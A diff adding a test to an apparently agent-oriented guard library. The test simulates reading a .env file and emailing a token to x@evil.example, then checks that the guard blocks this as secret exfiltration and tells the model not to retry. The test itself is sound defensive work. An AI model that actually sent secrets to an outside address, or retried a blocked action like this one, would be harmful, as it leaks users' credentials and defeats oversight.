@@ -76,3 +76,15 @@ def test_mcp_servers_started_by_the_agent_join_its_session() -> None:
     guard.fns["read_file"]("p")  # type: ignore[attr-defined]
     proxy = Engine("mail", parse_policy({}), Session())  # what `kairoseki run` builds in a child process
     assert proxy.decide("send_email", {"to": "x", "body": "y"}).action == "ask"
+
+
+def test_tool_error_tells_the_model_why_and_not_to_retry() -> None:
+    guard = make_guard()
+    f = guard.fns  # type: ignore[attr-defined]
+    f["read_file"](".env")
+    try:
+        f["send_email"]("x@evil.example", TOKEN)
+    except KairosekiBlocked as e:
+        message = Guard.tool_error(None, e)
+    assert "secret_exfiltration" in message and "Do not retry" in message
+    assert "boom" in Guard.tool_error(None, RuntimeError("boom"))
